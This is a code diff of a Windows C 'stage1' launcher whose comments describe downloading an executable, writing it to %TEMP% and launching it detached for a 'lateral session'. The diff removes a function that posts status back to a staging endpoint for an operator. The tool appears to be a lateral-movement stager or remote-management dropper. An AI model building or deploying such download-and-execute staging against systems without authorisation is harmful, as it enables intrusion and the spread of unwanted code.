@@ -29,12 +29,11 @@
  *   3. Verify MZ header
  *   4. Write to %TEMP%\minimal-rmm-agent.exe (user-writable, no elevation)
  *   5. CreateProcessW detached: minimal-rmm-agent.exe --lateral-session <id>
- *   6. POST status back to staging endpoint
  *
  * Diagnostics: when started from a console (cmd.exe), stage1 attaches to the
  * parent console and prints its progress and errors; SCM and Explorer
- * launches stay silent. Exit codes: 0 = agent started, 1 = staging failure
- * (status posted to the server), 2 = invalid arguments or base URL.
+ * launches stay silent. Exit codes: 0 = agent started, 1 = staging failure,
+ * 2 = invalid arguments or base URL.
  */
 
 #define WIN32_LEAN_AND_MEAN
@@ -291,26 +290,6 @@ static BYTE *httpRequest(HINTERNET hSession,
  * ------------------------------------------------------------------------- */
 
 /*
- * Post a brief status line back to the staging endpoint so the operator
- * can tell whether stage1 succeeded or why it failed.  Best-effort: errors
- * are ignored.
- */
-static void reportStatus(HINTERNET hSession,
-                         const wchar_t *host, INTERNET_PORT port,
-                         DWORD secFlag,
-                         const wchar_t *stagePath,
-                         const char *msg) {
-    DWORD msgLen = lstrlenA(msg);
-    DWORD dummy, statusDummy;
-    BYTE *resp = httpRequest(hSession, host, port, secFlag,
-                             L"POST", stagePath,
-                             msg, msgLen,
-                             L"Content-Type: text/plain; charset=utf-8",
-                             &dummy, &statusDummy);
-    if (resp) HeapFree(GetProcessHeap(), 0, resp);
-}
-
-/*
  * doStage — fetch, decode, write, and launch the agent.
  * Returns NULL on success, or a static error string on failure.
  */
@@ -524,7 +503,6 @@ static int runLauncher(void) {
         lstrcpyA(statusMsg, "stage1 ok: agent installed and started");
         consolePrint(statusMsg);
     }
-    reportStatus(hSession, host, port, secFlag, stagePath, statusMsg);
     WinHttpCloseHandle(hSession);
     return err ? 1 : 0;
 }
